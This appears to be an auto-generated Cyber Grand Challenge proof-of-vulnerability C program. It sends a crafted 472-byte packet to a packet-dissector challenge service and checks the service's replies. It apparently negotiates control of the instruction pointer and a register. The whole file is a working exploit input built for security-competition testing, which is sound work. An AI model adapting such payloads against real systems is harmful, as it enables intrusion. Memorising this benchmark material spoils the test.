#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd8\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xc0\x01\x00\x00\xb8\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb8\x01\x00\x00"
         "\xbd\x4a\xfc\x5f\xeb\xe5\x24\xb6\x8c\x4e\x96\xdd\x9c\x2d\xaf\x94"
         "\x72\xf3\xea\x3c\x40\x00\x00\x00\xff\x41\x00\x23\xc6\xfb\x39\x55"
         "\x7b\xa8\x7d\xa2\xf5\x4a\x89\x64\xf9\xf0\x47\x01\x00\xfa\x85\xd8"
         "\x3e\x6c\x81\xe4\x7b\xf2\x58\x53\xff\xff\x01\x7f\x01\x84\x3e\xcc"
         "\xdb\xe1\xdd\x1e\xf6\xd8\x3d\x2d\x9e\x68\x92\x43\x9d\x73\xf0\x5a"
         "\x87\x17\x01\x00\x07\xab\x85\x47\x71\x01\x9d\x6d\x01\xce\xca\x16"
         "\x74\xfd\xff\x4e\x22\xf0\x3f\xf6\xe6\x69\x65\x0a\x8b\x3b\xff\x5f"
         "\x2c\xc2\x61\xd8\x6b\x42\x64\x8b\x7c\x72\xd4\xf3\xfe\x7a\x35\x8f"
         "\x7c\x17\x5b\x99\x4a\xaf\xe8\xb9\x8f\x35\x0f\x38\x30\x72\xbf\xc5"
         "\x26\x64\x55\x28\x90\x29\x53\xfd\xa9\x7e\x0c\x0b\xe5\x8f\x69\x89"
         "\x5f\x09\x54\x9c\x93\x01\xdb\x4f\xbc\x8f\xb6\x2e\x5b\xd3\x9b\xf7"
         "\xf7\x0f\x12\x4e\x37\x03\x8e\x68\xcc\x39\xa1\x4a\xb3\xe9\x76\xfa"
         "\xe6\x30\x18\x9a\xd5\x27\x74\x14\xa2\x85\x18\x03\xf8\x54\x9c\x71"
         "\x13\xe7\x48\xde\xc9\x13\x37\x2b\x4c\x18\xe3\xea\xaa\x57\xdc\x16"
         "\x3c\x5e\x48\x12\xf0\x23\x99\x32\xe1\x61\x9a\xc1\x56\x50\xc7\xad"
         "\xc7\x64\x3e\x60\xbc\xcf\xe7\x41\x4b\x38\xd0\x7c\xaf\x6d\x12\x3a"
         "\x43\x9b\x39\x46\xb0\x42\x69\xe2\x44\x43\xa8\x78\x03\xc8\x4a\x9e"
         "\x86\x38\x43\x5b\x0f\xc9\x7f\x28\x7b\x4d\xea\x95\x03\xd9\x02\x73"
         "\xaa\xd5\x13\x22\x56\xbd\xdd\x9c\x76\xea\x1b\x08\x73\x54\x34\xb4"
         "\x5f\x8e\x25\x3d\x68\xaa\x20\xb7\xb9\x54\xf3\xf8\x08\x17\x22\x6e"
         "\x21\xf8\x54\x40\x3c\xa4\x2d\xbe\x6d\x57\x4f\x26\xdd\x41\x39\x70"
         "\x60\xa5\xeb\x7a\xc1\x5e\xc6\xd9\xa1\x0b\x53\xe6\xe3\x55\x52\xc3"
         "\x7c\x20\xe6\x77\xd1\xf4\x89\x08\xe6\x64\xea\x78\xa5\x8c\xc9\x12"
         "\x6a\x70\xcf\xdf\x29\x35\xee\xe6\xb3\x21\x19\x78\xd1\xcd\x80\x50"
         "\xd3\x6e\xff\xff\xff\xff\xbe\x9d\xfd\x8c\xad\x8e\x62\xb8\x8a\xa2"
         "\xc0\xb1\xde\xe5\xff\xff\xf9\xa4\xd8\x97\x1d\xa0\x90\xdf\x41\x00"
         "\x01\x00\x88\x5d\x0a\x1a\x4e\xfe\x3a\x14\x81\x6c\x01\xbe\x99\xea"
         "\x2f\x65\x01\x00\x18\xc9\x01\x99";
      static unsigned int write_00001_00000_len = 472;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasquatinid
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x71\x75\x61\x74\x69"
         "\x6e\x69\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
